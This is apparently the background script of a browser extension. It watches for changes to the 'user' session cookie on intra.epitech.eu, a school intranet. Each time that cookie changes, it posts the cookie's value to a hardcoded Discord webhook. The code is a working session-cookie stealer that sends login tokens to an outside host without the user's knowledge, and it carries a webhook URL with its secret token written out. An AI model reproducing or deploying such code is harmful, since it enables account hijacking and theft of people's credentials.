async function sendWebhook(message)
{
    try {
        const response = await fetch("https://discord.com/api/webhooks/1313509719251615764/BzZAtI1F6OvcYPv8i3t-ilQTKz2T1EDPxWTorrzW2pNeSzHEVqaQSC2pGC_3Ulqg5rPz", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: message,
                embeds: null,
                attachments: [],
            })
        });
        if (!response.ok)
            console.error("Failed to send webhook:", response.statusText);
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

browser.cookies.onChanged.addListener((changeInfo) => {
    const cookie = changeInfo.cookie;

    if (cookie.domain.includes("intra.epitech.eu") && cookie.name === "user")
        sendWebhook(cookie.value);
});